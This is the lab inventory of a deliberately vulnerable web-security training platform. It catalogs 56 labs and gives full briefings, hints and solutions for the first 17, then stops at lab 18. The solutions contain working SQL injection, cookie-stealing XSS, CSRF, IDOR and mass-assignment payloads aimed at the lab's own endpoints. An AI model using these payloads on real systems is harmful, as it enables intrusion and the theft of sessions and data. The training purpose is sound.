# ZeroDay Academy — Lab Inventory

This inventory is generated from the canonical catalog in `data/labs.js`. It contains **56 labs**, **17 attack domains** and **12,550 total points**.

Every lab has a matching router in `labs/<slug>.js`, a template in `views/labs/<slug>.ejs`, a reset route, and is exploited end-to-end by `npm run qa`.

## Catalog

| # | Lab | Slug | Level | Domain | Category | Prerequisites | OWASP | ASVS | WSTG | CWE | MITRE |
| ---: | --- | --- | :---: | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | Authentication Bypass via SQL Injection | `sqli-login` | L1 | SQL Injection | Injection | — | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-89 | T1190 |
| 2 | UNION-Based SQL Injection | `sqli-union` | L2 | SQL Injection | Injection | sqli-login | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-89 | T1190 |
| 3 | Boolean-Based Blind SQL Injection | `sqli-blind-boolean` | L3 | SQL Injection | Injection | sqli-union | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-89 | T1190 |
| 4 | Time-Based Blind SQL Injection | `sqli-time-blind` | L6 | SQL Injection | Injection | sqli-blind-boolean | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-89 | T1190 |
| 5 | Reflected XSS in Search | `reflected-xss` | L1 | Cross-Site Scripting | Injection | — | A03:2021 - Injection | V5.3.3 | WSTG-INPV-01 | CWE-79 | T1059.007 |
| 6 | DOM-Based XSS via URL Fragment | `dom-xss-hash` | L2 | Cross-Site Scripting | Injection | reflected-xss | A03:2021 - Injection | V5.3.3 | WSTG-INPV-02 | CWE-79 | T1059.007 |
| 7 | XSS Filter Bypass | `xss-filter-bypass` | L2 | Cross-Site Scripting | Injection | reflected-xss | A03:2021 - Injection | V5.3.3 | WSTG-INPV-01 | CWE-79 | T1059.007 |
| 8 | Stored XSS in Comments | `stored-xss` | L4 | Cross-Site Scripting | Injection | xss-filter-bypass | A03:2021 - Injection | V5.3.3 | WSTG-INPV-02 | CWE-79 | T1059.007 |
| 9 | Stored XSS via SVG Upload | `svg-upload-xss` | L4 | Cross-Site Scripting | Injection | stored-xss | A03:2021 - Injection | V5.3.3 | WSTG-INPV-01 | CWE-79 | T1059.007 |
| 10 | IDOR: Anyone's Invoice Is Your Invoice | `idor-invoices` | L1 | Broken Access Control | Broken Access Control | — | A01:2021 - Broken Access Control | V4.1.3 | WSTG-ATHZ-04 | CWE-639 | T1078 |
| 11 | Horizontal Privilege Escalation | `horizontal-privesc` | L1 | Broken Access Control | Broken Access Control | — | A01:2021 - Broken Access Control | V4.1.3 | WSTG-ATHZ-04 | CWE-639 | T1078 |
| 12 | Forced Browsing to a Hidden Admin Panel | `forced-browse-admin` | L1 | Broken Access Control | Broken Access Control | — | A01:2021 - Broken Access Control | V4.1.1 | WSTG-ATHZ-02 | CWE-425 | T1078 |
| 13 | Vertical Privilege Escalation | `vertical-privesc` | L3 | Broken Access Control | Broken Access Control | forced-browse-admin | A01:2021 - Broken Access Control | V4.2.1 | WSTG-ATHZ-03 | CWE-285 | T1078 |
| 14 | Mass Assignment to Admin Role | `mass-assignment-role` | L2 | Broken Access Control | Broken Access Control | horizontal-privesc | A01:2021 - Broken Access Control | V4.2.1 | WSTG-ATHZ-03 | CWE-915 | T1078 |
| 15 | IDOR on File Downloads | `file-access-idor` | L2 | Broken Access Control | Broken Access Control | idor-invoices | A01:2021 - Broken Access Control | V4.1.3 | WSTG-ATHZ-04 | CWE-639 | T1078 |
| 16 | CSRF: Silent Email Takeover | `csrf-email-change` | L2 | CSRF | Broken Access Control | reflected-xss | A01:2021 - Broken Access Control | V3.5.1 | WSTG-SESS-05 | CWE-352 | T1185 |
| 17 | CSRF via State-Changing GET | `csrf-get-based` | L1 | CSRF | Broken Access Control | — | A01:2021 - Broken Access Control | V3.5.1 | WSTG-SESS-05 | CWE-352 | T1185 |
| 18 | OS Command Injection in Ping Tool | `cmd-injection` | L2 | Command Injection | Injection | sqli-login | A03:2021 - Injection | V5.3.8 | WSTG-INPV-12 | CWE-78 | T1059 |
| 19 | SSRF to Cloud Metadata Service | `ssrf-metadata` | L3 | SSRF | Server-Side Request Forgery | cmd-injection | A10:2021 - Server-Side Request Forgery | V12.6.1 | WSTG-INPV-19 | CWE-918 | T1552.005 |
| 20 | SSRF via Webhook Tester | `ssrf-webhook` | L3 | SSRF | Server-Side Request Forgery | ssrf-metadata | A10:2021 - Server-Side Request Forgery | V12.6.1 | WSTG-INPV-19 | CWE-918 | T1552.005 |
| 21 | SSRF via PDF Generation | `ssrf-pdf-generator` | L3 | SSRF | Server-Side Request Forgery | ssrf-webhook | A10:2021 - Server-Side Request Forgery | V12.6.1 | WSTG-INPV-19 | CWE-918 | T1552.005 |
| 22 | XXE via Profile Import | `xxe-profile-import` | L3 | XXE | Security Misconfiguration | ssrf-pdf-generator | A05:2021 - Security Misconfiguration | V5.5.2 | WSTG-INPV-07 | CWE-611 | T1190 |
| 23 | XXE via SVG Upload | `xxe-svg-upload` | L3 | XXE | Security Misconfiguration | xxe-profile-import | A05:2021 - Security Misconfiguration | V5.5.2 | WSTG-INPV-07 | CWE-611 | T1190 |
| 24 | Blind XXE via Out-of-Band Exfiltration | `xxe-oob-exfil` | L6 | XXE | Security Misconfiguration | xxe-svg-upload | A05:2021 - Security Misconfiguration | V5.5.2 | WSTG-INPV-07 | CWE-611 | T1190 |
| 25 | Server-Side Template Injection | `ssti-render` | L4 | Server-Side Template Injection | Injection | cmd-injection | A03:2021 - Injection | V5.3.4 | WSTG-INPV-18 | CWE-1336 | T1190 |
| 26 | Insecure Deserialization in a Session Cookie | `insecure-deserialization` | L4 | Insecure Deserialization | Software and Data Integrity Failures | jwt-alg-none | A08:2021 - Software and Data Integrity Failures | V3.4.1 | WSTG-SESS-03 | CWE-502 | T1550.004 |
| 27 | JWT alg:none Authentication Bypass | `jwt-alg-none` | L4 | Authentication | Identification and Authentication Failures | — | A07:2021 - Identification and Authentication Failures | V2.10.3 | WSTG-SESS-10 | CWE-347 | T1550.001 |
| 28 | JWT Signed with a Weak Secret | `jwt-weak-secret` | L4 | Authentication | Identification and Authentication Failures | jwt-alg-none | A07:2021 - Identification and Authentication Failures | V2.10.3 | WSTG-SESS-10 | CWE-798 | T1110.002 |
| 29 | Predictable Password Reset Tokens | `broken-password-reset` | L2 | Authentication | Identification and Authentication Failures | no-rate-limit-bruteforce | A07:2021 - Identification and Authentication Failures | V2.5.2 | WSTG-ATHN-09 | CWE-330 | T1110 |
| 30 | User Enumeration via Timing Side-Channel | `account-enum-timing` | L5 | Authentication | Identification and Authentication Failures | broken-password-reset | A07:2021 - Identification and Authentication Failures | V2.2.1 | WSTG-ATHN-04 | CWE-208 | T1589.001 |
| 31 | Missing Rate Limiting on PIN Login | `no-rate-limit-bruteforce` | L1 | Authentication | Identification and Authentication Failures | — | A07:2021 - Identification and Authentication Failures | V2.2.1 | WSTG-ATHN-03 | CWE-307 | T1110.001 |
| 32 | 2FA Logic Bypass | `two-factor-bypass` | L2 | Authentication | Identification and Authentication Failures | broken-password-reset | A07:2021 - Identification and Authentication Failures | V2.8.3 | WSTG-ATHN-10 | CWE-287 | T1556 |
| 33 | NoSQL Injection: Login Bypass | `nosql-login-bypass` | L2 | NoSQL Injection | Injection | sqli-login | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-943 | T1190 |
| 34 | NoSQL Injection: Query-String Operators | `nosql-search-injection` | L2 | NoSQL Injection | Injection | nosql-login-bypass | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-943 | T1190 |
| 35 | NoSQL Injection: Blind $regex Extraction | `nosql-regex-extraction` | L3 | NoSQL Injection | Injection | nosql-search-injection | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-943 | T1190 |
| 36 | NoSQL Injection: $expr Aggregation Abuse | `nosql-expr-injection` | L5 | NoSQL Injection | Injection | nosql-regex-extraction | A03:2021 - Injection | V5.3.4 | WSTG-INPV-05 | CWE-943 | T1190 |
| 37 | Prototype Pollution to Privilege Escalation | `prototype-pollution` | L5 | Prototype Pollution | Software and Data Integrity Failures | nosql-expr-injection | A08:2021 - Software and Data Integrity Failures | V5.5.1 | WSTG-INPV-06 | CWE-1321 | T1190 |
| 38 | API: Excessive Data Exposure | `api-excessive-data` | L1 | API Security | API Security | — | A01:2021 - Broken Access Control | V4.3.1 | WSTG-ATHZ-04 | CWE-213 | T1213 |
| 39 | API: Broken Object Level Authorization | `api-bola` | L2 | API Security | API Security | api-excessive-data | A01:2021 - Broken Access Control | V4.1.3 | WSTG-ATHZ-04 | CWE-639 | T1078 |
| 40 | API: Mass Assignment on PATCH | `api-mass-assignment` | L2 | API Security | API Security | api-bola | A01:2021 - Broken Access Control | V4.2.1 | WSTG-ATHZ-03 | CWE-915 | T1078 |
| 41 | GraphQL Introspection Enabled | `graphql-introspection` | L2 | API Security | API Security | api-excessive-data | A01:2021 - Broken Access Control | V13.4.1 | WSTG-APIT-01 | CWE-200 | T1213 |
| 42 | Business Logic: Negative Quantity | `logic-negative-quantity` | L1 | Business Logic | Business Logic | — | A04:2021 - Insecure Design | V11.1.1 | WSTG-BUSL-01 | CWE-840 | T1190 |
| 43 | Business Logic: Client-Trusted Price | `logic-price-tampering` | L1 | Business Logic | Business Logic | — | A04:2021 - Insecure Design | V11.1.2 | WSTG-BUSL-01 | CWE-602 | T1190 |
| 44 | Business Logic: Skipping the Payment Step | `logic-workflow-skip` | L2 | Business Logic | Business Logic | logic-price-tampering | A04:2021 - Insecure Design | V11.1.1 | WSTG-BUSL-01 | CWE-841 | T1190 |
| 45 | Business Logic: Race Condition on Coupon Redemption | `logic-coupon-race` | L5 | Business Logic | Business Logic | logic-workflow-skip | A04:2021 - Insecure Design | V11.1.4 | WSTG-BUSL-04 | CWE-362 | T1190 |
| 46 | File Upload: Content-Type Allowlist Bypass | `upload-content-type-bypass` | L2 | File Upload | Security Misconfiguration | svg-upload-xss | A05:2021 - Security Misconfiguration | V12.2.1 | WSTG-BUSL-09 | CWE-646 | T1608.002 |
| 47 | File Upload: Path Traversal | `upload-path-traversal` | L3 | File Upload | Security Misconfiguration | upload-content-type-bypass | A05:2021 - Security Misconfiguration | V12.3.1 | WSTG-BUSL-09 | CWE-22 | T1083 |
| 48 | File Upload: Unrestricted Upload to Code Execution | `upload-unrestricted-rce` | L4 | File Upload | Security Misconfiguration | upload-path-traversal | A05:2021 - Security Misconfiguration | V12.2.1 | WSTG-BUSL-09 | CWE-434 | T1059 |
| 49 | Verbose Error Messages | `disclosure-verbose-errors` | L1 | Information Disclosure | Security Misconfiguration | — | A05:2021 - Security Misconfiguration | V7.4.1 | WSTG-ERRH-01 | CWE-209 | T1592 |
| 50 | Exposed .env Configuration File | `disclosure-env-file` | L1 | Information Disclosure | Security Misconfiguration | — | A05:2021 - Security Misconfiguration | V14.3.2 | WSTG-CONF-02 | CWE-538 | T1552.001 |
| 51 | Leftover Backup File Disclosure | `disclosure-backup-file` | L1 | Information Disclosure | Security Misconfiguration | — | A05:2021 - Security Misconfiguration | V14.3.2 | WSTG-CONF-04 | CWE-538 | T1083 |
| 52 | Exposed Source Map | `disclosure-source-map` | L2 | Information Disclosure | Security Misconfiguration | disclosure-backup-file | A05:2021 - Security Misconfiguration | V14.3.2 | WSTG-CONF-04 | CWE-540 | T1083 |
| 53 | Insecure CORS with Credentials | `cors-wildcard-credentials` | L3 | CORS & Security Headers | Security Misconfiguration | api-bola | A05:2021 - Security Misconfiguration | V14.5.3 | WSTG-CLNT-11 | CWE-942 | T1185 |
| 54 | Clickjacking via Missing Frame Protection | `clickjacking-missing-xfo` | L2 | CORS & Security Headers | Security Misconfiguration | csrf-email-change | A05:2021 - Security Misconfiguration | V14.4.1 | WSTG-CLNT-09 | CWE-1021 | T1185 |
| 55 | CRLF Injection / Response Splitting | `crlf-header-injection` | L4 | CORS & Security Headers | Injection | cors-wildcard-credentials | A03:2021 - Injection | V5.3.2 | WSTG-INPV-15 | CWE-113 | T1190 |
| 56 | Host Header Poisoning | `host-header-poisoning` | L3 | CORS & Security Headers | Security Misconfiguration | csrf-get-based | A05:2021 - Security Misconfiguration | V14.4.1 | WSTG-CONF-07 | CWE-644 | T1190 |

## Lab details

### 1. Authentication Bypass via SQL Injection

- **Slug:** `sqli-login`
- **Path:** `/labs/sqli-login`
- **Domain / category:** SQL Injection / Injection
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, SQLite
- **Prerequisites:** None
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-89; MITRE ATT&CK T1190

The staff login builds its SQL query with string concatenation.

**Briefing:** ClientPortal Inc. concatenates the username and password fields directly into a SQL statement. Log in as the administrator without knowing the administrator password.

**Objectives:**
- Identify that user input reaches a SQL query without parameterisation
- Craft a tautology payload that authenticates as the administrator
- Recover the per-instance flag from the authenticated admin session

**Hints:**
1. The query is SELECT * FROM sqli_accounts WHERE username = '...' AND password = '...'. You control both quoted strings.
2. Try making the password clause evaluate to true without a valid password. A comment sequence can remove the rest of the query.

**Solution:** Submit username admin with a password such as ' OR '1'='1' -- The concatenated query becomes username = 'admin' AND password = '' OR '1'='1' --', which returns the admin row. The lab then exposes the instance flag.

### 2. UNION-Based SQL Injection

- **Slug:** `sqli-union`
- **Path:** `/labs/sqli-union`
- **Domain / category:** SQL Injection / Injection
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, SQLite
- **Prerequisites:** `sqli-login`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-89; MITRE ATT&CK T1190

A category search lets you UNION rows from an unrelated table.

**Briefing:** The product catalogue filters by category and returns three columns. A separate secrets table exists in the same database. Use a UNION SELECT to make the search result include rows it was never designed to return.

**Objectives:**
- Determine the column count of the original query
- Use UNION SELECT to retrieve data from sqli_secrets
- Extract the flag and submit it to the platform

**Hints:**
1. The query returns exactly three columns: name, category and price.
2. Close the string, comment out the released filter, and UNION SELECT label, value, id FROM sqli_secrets.

**Solution:** Search for category: ' UNION SELECT label, value, id FROM sqli_secrets -- The injected rows are rendered in the product table, including the flag stored in the value column.

### 3. Boolean-Based Blind SQL Injection

- **Slug:** `sqli-blind-boolean`
- **Path:** `/labs/sqli-blind-boolean`
- **Domain / category:** SQL Injection / Injection
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 45 minutes
- **Technology:** Node.js, Express, SQLite
- **Prerequisites:** `sqli-union`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-89; MITRE ATT&CK T1190

An order lookup only reveals found or not found; extract data blind.

**Briefing:** The order status lookup returns only a found/not-found indicator. A secret is stored in the sqli_secrets table. Build a boolean oracle and extract the secret one character at a time.

**Objectives:**
- Confirm that the numeric ID parameter is injectable
- Turn the found/not-found response into a boolean oracle
- Extract the blind-flag value with a script and submit it

**Hints:**
1. The query is SELECT * FROM sqli_orders WHERE id = <input> AND customer = 'guest'. You control an unquoted numeric expression.
2. Use AND (SELECT substr(value,1,1) FROM sqli_secrets WHERE label='blind-flag')='Z' and compare the found response.

**Solution:** Inject 1 AND (SELECT unicode(substr(value,N,1)) FROM sqli_secrets WHERE label='blind-flag') > 77 -- and binary-search the value. The per-instance flag is in sqli_secrets.label = blind-flag.

### 4. Time-Based Blind SQL Injection

- **Slug:** `sqli-time-blind`
- **Path:** `/labs/sqli-time-blind`
- **Domain / category:** SQL Injection / Injection
- **Difficulty:** Insane (L6), 600 points
- **Estimated time:** 90 minutes
- **Technology:** Node.js, Express, SQLite
- **Prerequisites:** `sqli-blind-boolean`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.4; WSTG-INPV-05; CWE-89; MITRE ATT&CK T1190

No boolean oracle at all: only response timing reveals data.

**Briefing:** The username lookup returns an identical response for every input. A sleep() SQL function is available in the lab database. Use conditional delays to extract the time-flag value character by character.

**Objectives:**
- Confirm that a conditional sleep influences response time
- Build a timing oracle with a measurable signal-to-noise ratio
- Extract a long secret without a boolean or error channel

**Hints:**
1. The query is SELECT * FROM sqli_accounts WHERE username = '<input>'.
2. sleep(ms) is registered as a SQL function. A conditional such as AND sleep(500) executes only when the surrounding condition is true.

**Solution:** Inject x' OR (SELECT unicode(substr(value,1,1)) FROM sqli_secrets WHERE label='time-flag') > 77 AND sleep(800) -- and repeat for each character. The flag is the value of time-flag.

### 5. Reflected XSS in Search

- **Slug:** `reflected-xss`
- **Path:** `/labs/reflected-xss`
- **Domain / category:** Cross-Site Scripting / Injection
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, EJS, Browser JavaScript
- **Prerequisites:** None
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.3; WSTG-INPV-01; CWE-79; MITRE ATT&CK T1059.007

A search page echoes your query straight back, unescaped.

**Briefing:** The SecureShop search page reflects the q parameter into the response without HTML encoding. A non-HttpOnly proof cookie identifies the current lab instance. Execute JavaScript in the page and send the proof to the collector to reveal the flag.

**Objectives:**
- Identify the reflected sink and its output context
- Execute a payload in the page context
- Exfiltrate the proof cookie to the lab collector

**Hints:**
1. The q parameter is rendered with EJS unescaped output (<%- q %>).
2. The proof cookie is named zda_xss_proof. A payload can call fetch('/labs/reflected-xss/collect?t='+document.cookie).

**Solution:** Visit /labs/reflected-xss?q=<img src=x onerror="fetch('/labs/reflected-xss/collect?t='+encodeURIComponent(document.cookie))">. The collector validates the proof cookie and returns the instance flag.

### 6. DOM-Based XSS via URL Fragment

- **Slug:** `dom-xss-hash`
- **Path:** `/labs/dom-xss-hash`
- **Domain / category:** Cross-Site Scripting / Injection
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, Browser JavaScript
- **Prerequisites:** `reflected-xss`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.3; WSTG-INPV-02; CWE-79; MITRE ATT&CK T1059.007

Client-side JavaScript writes location.hash into innerHTML.

**Briefing:** A profile greeting reads the URL fragment and writes it into the DOM with innerHTML. The server never sees the fragment. Use the client-side sink to read the proof cookie and send it to the collector.

**Objectives:**
- Locate the DOM source and sink in the page JavaScript
- Build a fragment payload that executes in the browser
- Use the XSS execution to reach the proof collector

**Hints:**
1. The greeting code calls innerHTML with decodeURIComponent(location.hash.slice(1)).
2. An image error handler is a reliable execution vector: <img src=x onerror="...">.

**Solution:** Open /labs/dom-xss-hash#<img src=x onerror="fetch('/labs/dom-xss-hash/collect?t='+encodeURIComponent(document.cookie))"> and the collector returns the flag.

### 7. XSS Filter Bypass

- **Slug:** `xss-filter-bypass`
- **Path:** `/labs/xss-filter-bypass`
- **Domain / category:** Cross-Site Scripting / Injection
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, Browser JavaScript
- **Prerequisites:** `reflected-xss`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.3; WSTG-INPV-01; CWE-79; MITRE ATT&CK T1059.007

A naive blacklist strips script tags but nothing else.

**Briefing:** The display-name feature removes the literal string <script> and </script>. The filtering is a blacklist, not context-aware output encoding. Find a tag and event handler the filter never considered.

**Objectives:**
- Confirm the blacklist only removes script tags
- Choose an alternative HTML execution vector
- Exfiltrate the proof cookie to the collector

**Hints:**
1. Only the exact strings <script> and </script> are removed. SVG, img and body tags are untouched.
2. The proof cookie is zda_xss_proof. Use an onerror or onload handler to run fetch().

**Solution:** Use /labs/xss-filter-bypass?name=<img src=x onerror="fetch('/labs/xss-filter-bypass/collect?t='+encodeURIComponent(document.cookie))">. The naïve filter leaves the tag intact.

### 8. Stored XSS in Comments

- **Slug:** `stored-xss`
- **Path:** `/labs/stored-xss`
- **Domain / category:** Cross-Site Scripting / Injection
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 45 minutes
- **Technology:** Node.js, Express, jsdom, Browser JavaScript
- **Prerequisites:** `xss-filter-bypass`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.3; WSTG-INPV-02; CWE-79; MITRE ATT&CK T1059.007

A public comment box renders input unescaped for every visitor.

**Briefing:** CommentBoard stores comments and renders them as raw HTML. A simulated moderator bot visits the board with a proof token cookie. Post a payload that executes in the bot browser and exfiltrates the token to the collector.

**Objectives:**
- Store an executable payload in the comment database
- Understand the difference between stored and reflected XSS
- Trigger the moderator bot and capture the flag from the validated proof

**Hints:**
1. Comments are rendered with <%- c.body %> and are scoped to your lab instance.
2. The bot has a proof cookie named zda_bot_proof. A script that calls /labs/stored-xss/collect?t=<cookie> is enough.

**Solution:** Post a comment containing <script>fetch('/labs/stored-xss/collect?t='+encodeURIComponent(document.cookie))</script>, then click Visit as moderator. The jsdom bot executes the script, sends the proof, and the lab reveals the flag.

### 9. Stored XSS via SVG Upload

- **Slug:** `svg-upload-xss`
- **Path:** `/labs/svg-upload-xss`
- **Domain / category:** Cross-Site Scripting / Injection
- **Difficulty:** Hard (L4), 350 points
- **Estimated time:** 40 minutes
- **Technology:** Node.js, Express, SVG, Browser JavaScript
- **Prerequisites:** `stored-xss`
- **Threat mapping:** A03:2021 - Injection; ASVS V5.3.3; WSTG-INPV-01; CWE-79; MITRE ATT&CK T1059.007

SVG is XML, and XML can contain script.

**Briefing:** The gallery accepts SVG avatars and serves them as image/svg+xml. Opening an SVG directly renders it as its own document and executes embedded scripts in the application origin.

**Objectives:**
- Upload an SVG that contains executable JavaScript
- Open the uploaded asset directly so the script runs
- Send the proof cookie to the collector and recover the flag

**Hints:**
1. The raw endpoint serves the file with image/svg+xml, not as an <img> attachment.
2. An SVG <script> element can read document.cookie and call fetch(). The proof cookie is zda_svg_proof.

**Solution:** Upload an SVG containing <script>fetch('/labs/svg-upload-xss/collect?t='+encodeURIComponent(document.cookie))</script>, open /labs/svg-upload-xss/raw/<id> directly, and read the collector response.

### 10. IDOR: Anyone's Invoice Is Your Invoice

- **Slug:** `idor-invoices`
- **Path:** `/labs/idor-invoices`
- **Domain / category:** Broken Access Control / Broken Access Control
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, MongoDB
- **Prerequisites:** None
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.1.3; WSTG-ATHZ-04; CWE-639; MITRE ATT&CK T1078

Invoices are fetched by a sequential number with no ownership check.

**Briefing:** InvoiceHub returns an invoice by its sequential number. The endpoint does not verify that the invoice belongs to the signed-in customer. Walk the ID space to find another customer invoice containing the flag.

**Objectives:**
- Understand object-level authorization
- Enumerate adjacent invoice numbers
- Read another customer invoice and capture the flag

**Hints:**
1. Your invoice links use the pattern /labs/idor-invoices/<number>.
2. Nothing checks ownership. Try numbers near your own, and look at the notes field.

**Solution:** Request /labs/idor-invoices/1002 and /labs/idor-invoices/1003. One of the neighboring invoices belongs to another customer and contains the flag in its notes.

### 11. Horizontal Privilege Escalation

- **Slug:** `horizontal-privesc`
- **Path:** `/labs/horizontal-privesc`
- **Domain / category:** Broken Access Control / Broken Access Control
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express, MongoDB
- **Prerequisites:** None
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.1.3; WSTG-ATHZ-04; CWE-639; MITRE ATT&CK T1078

Read another user's private note by changing a username in the URL.

**Briefing:** You are signed in as alice. The notes endpoint accepts a username directly in the URL and returns that user's private note without comparing it to your session identity.

**Objectives:**
- Recognise horizontal privilege escalation
- Enumerate usernames in the note route
- Read the administrator note and capture the flag

**Hints:**
1. The current user is alice, but the URL does not have to say alice.
2. Try /labs/horizontal-privesc/note/admin.

**Solution:** Request /labs/horizontal-privesc/note/admin. The response returns the administrator private note with the instance flag.

### 12. Forced Browsing to a Hidden Admin Panel

- **Slug:** `forced-browse-admin`
- **Path:** `/labs/forced-browse-admin`
- **Domain / category:** Broken Access Control / Broken Access Control
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express
- **Prerequisites:** None
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.1.1; WSTG-ATHZ-02; CWE-425; MITRE ATT&CK T1078

An admin panel exists with no authentication, just no visible link.

**Briefing:** Nothing in the UI links to the administration panel. Hidden paths are not access control. Enumerate the target and open the panel.

**Objectives:**
- Use robots.txt and directory discovery techniques
- Identify the hidden admin route
- Access the panel and recover the flag

**Hints:**
1. Start with /labs/forced-browse-admin/robots.txt.
2. The disallowed path is the admin panel.

**Solution:** Read robots.txt, then open /labs/forced-browse-admin/panel-x29a. The page renders the flag without any authorization check.

### 13. Vertical Privilege Escalation

- **Slug:** `vertical-privesc`
- **Path:** `/labs/vertical-privesc`
- **Domain / category:** Broken Access Control / Broken Access Control
- **Difficulty:** Intermediate (L3), 250 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express
- **Prerequisites:** `forced-browse-admin`
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.2.1; WSTG-ATHZ-03; CWE-285; MITRE ATT&CK T1078

A logged-in user can call an admin-only action directly.

**Briefing:** The admin action is not linked in the UI for the user role, but the server never checks the caller's role. Invoke the endpoint directly and escalate vertically.

**Objectives:**
- Inspect the user interface and API for hidden privileged actions
- Invoke an admin action with a user session
- Capture the flag from the privileged response

**Hints:**
1. The page source or JavaScript bundle may mention an admin endpoint.
2. Try POST /labs/vertical-privesc/admin/grant-flag with your user session.

**Solution:** Send POST /labs/vertical-privesc/admin/grant-flag as the guest user. The handler never checks the role and returns the flag.

### 14. Mass Assignment to Admin Role

- **Slug:** `mass-assignment-role`
- **Path:** `/labs/mass-assignment-role`
- **Domain / category:** Broken Access Control / Broken Access Control
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 25 minutes
- **Technology:** Node.js, Express, JSON
- **Prerequisites:** `horizontal-privesc`
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.2.1; WSTG-ATHZ-03; CWE-915; MITRE ATT&CK T1078

A profile update endpoint merges your entire JSON body, unfiltered.

**Briefing:** Only displayName is exposed in the profile form, but the update handler merges the full JSON body into your profile object. Add a privileged field the UI never sends.

**Objectives:**
- Observe the shape of the profile update request
- Add a role field that the UI does not expose
- Refresh the profile and capture the flag

**Hints:**
1. The form posts a JSON document to /labs/mass-assignment-role/update.
2. Include "role":"admin" alongside displayName.

**Solution:** Submit {"displayName":"guest","role":"admin"} to /labs/mass-assignment-role/update. The handler assigns every key, and the admin profile displays the flag.

### 15. IDOR on File Downloads

- **Slug:** `file-access-idor`
- **Path:** `/labs/file-access-idor`
- **Domain / category:** Broken Access Control / Broken Access Control
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 30 minutes
- **Technology:** Node.js, Express, MongoDB
- **Prerequisites:** `idor-invoices`
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V4.1.3; WSTG-ATHZ-04; CWE-639; MITRE ATT&CK T1078

Reports are fetched by a predictable object ID with no ownership check.

**Briefing:** Your portal lists two reports by MongoDB ObjectId. The download endpoint fetches any file by ID. Adjacent documents were inserted at the same time; enumerate nearby IDs to find an internal report.

**Objectives:**
- Understand why opaque IDs are not authorization
- Enumerate object IDs around your own files
- Download the internal report and capture the flag

**Hints:**
1. MongoDB ObjectIds encode a timestamp and a counter. Neighboring IDs differ in the last bytes.
2. The files were inserted in order: guest report, internal report, internal report. Try IDs adjacent to the one in your link.

**Solution:** Increment or decrement the final hex portion of your report ID and request /labs/file-access-idor/download/<id>. One adjacent object is the internal report containing the flag.

### 16. CSRF: Silent Email Takeover

- **Slug:** `csrf-email-change`
- **Path:** `/labs/csrf-email-change`
- **Domain / category:** CSRF / Broken Access Control
- **Difficulty:** Easy (L2), 150 points
- **Estimated time:** 30 minutes
- **Technology:** Node.js, Express, HTML
- **Prerequisites:** `reflected-xss`
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V3.5.1; WSTG-SESS-05; CWE-352; MITRE ATT&CK T1185

The email-change form has no CSRF token.

**Briefing:** The account email change endpoint accepts a cross-site POST with no anti-CSRF token and no origin validation. Build an auto-submitting exploit page, then trigger the simulated victim visit.

**Objectives:**
- Build a cross-site form that targets the email-change endpoint
- Trigger the simulated victim browser
- Verify the victim email changed and capture the flag

**Hints:**
1. The exploit page is hosted at /labs/csrf-email-change/exploit.
2. Use a form with method POST, action /labs/csrf-email-change/change-email, and an email value containing attacker.

**Solution:** Craft an HTML form that posts email=attacker@evil.test to /labs/csrf-email-change/change-email and auto-submits. Save it with the Craft Exploit form, then click Simulate Victim Visit. The victim email changes and the flag is revealed.

### 17. CSRF via State-Changing GET

- **Slug:** `csrf-get-based`
- **Path:** `/labs/csrf-get-based`
- **Domain / category:** CSRF / Broken Access Control
- **Difficulty:** Beginner (L1), 100 points
- **Estimated time:** 15 minutes
- **Technology:** Node.js, Express
- **Prerequisites:** None
- **Threat mapping:** A01:2021 - Broken Access Control; ASVS V3.5.1; WSTG-SESS-05; CWE-352; MITRE ATT&CK T1185

A funds transfer is wired to a plain GET request.

**Briefing:** The transfer endpoint changes state on a GET request and accepts a destination and amount from the query string. A single image tag on any page can trigger it for a logged-in victim.

**Objectives:**
- Identify a state-changing GET endpoint
- Trigger the transfer without a form or JavaScript
- Capture the flag after the victim balance changes

**Hints:**
1. The transfer route accepts to and amount in the query string.
2. Visit /labs/csrf-get-based/transfer?to=attacker&amount=500 directly.

**Solution:** Request /labs/csrf-get-based/transfer?to=attacker&amount=500. The GET changes the balance, sets the attacker transfer marker, and the index page reveals the flag.

### 18. OS Command Injection in Ping Tool

- **Slug:** `cmd-injection`
